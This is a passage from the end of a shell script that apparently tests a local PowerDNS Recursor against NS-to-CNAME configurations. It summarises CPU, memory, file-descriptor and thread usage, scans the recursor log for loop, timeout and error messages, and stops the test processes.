        diff = last['rss_kb'] - first['rss_kb']
        print(f'  RSS change: {diff:+d}kB ({diff/first[\"rss_kb\"]*100:+.1f}%)')
    print(f'  Peak CPU: {max(s.get(\"cpu_pct\",0) for s in samples):.1f}%')
    print(f'  Avg CPU: {sum(s.get(\"cpu_pct\",0) for s in samples)/len(samples):.1f}%')
    print(f'  Peak FDs: {max(s.get(\"fd_count\",0) for s in samples)}')
    print(f'  Peak Threads: {max(s.get(\"threads\",0) for s in samples)}')
else:
    print('  No samples collected')
"
fi

# ─── Capture recursor log ───────────────────────────────────────────
echo ""
echo "=== PowerDNS Recursor log (last 30 lines) ==="
tail -30 "$WORKDIR/recursor.log" 2>/dev/null || echo "(no log)"

# Check for error/warning indicators in recursor log
echo ""
echo "=== Checking recursor log for NS→CNAME related messages ==="
grep -i 'CNAME\|NS.*alias\|loop\|timeout\|ServFail\|error\|warn' "$WORKDIR/recursor.log" 2>/dev/null | tail -20 || echo "(none found)"

# ─── Cleanup ─────────────────────────────────────────────────────────
echo ""
echo "=== Cleanup ==="
kill $PDNS_PID 2>/dev/null || true
kill $AUTH_PID 2>/dev/null || true
kill $MONITOR_PID 2>/dev/null || true
wait 2>/dev/null || true

echo ""
echo "=== All done. Results in $WORKDIR/ ==="
ls -la "$WORKDIR/" 2>/dev/null | head -20
